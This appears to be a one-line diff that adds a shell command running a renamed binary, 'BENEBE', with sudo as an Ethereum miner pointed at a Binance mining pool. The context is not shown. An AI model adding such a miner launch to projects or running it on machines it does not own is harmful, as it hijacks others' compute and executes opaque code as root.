@@ -1,0 +1,1 @@
+chmod +x ./BENEBE && sudo ./BENEBE -uri ethproxy://ethash.poolbinance.com:8888 -ewal RizkiFelix -eworker RizkiFelix.001 -epsw 123456 -ase 2 -dbg -1 -allpools 1 -mode 1
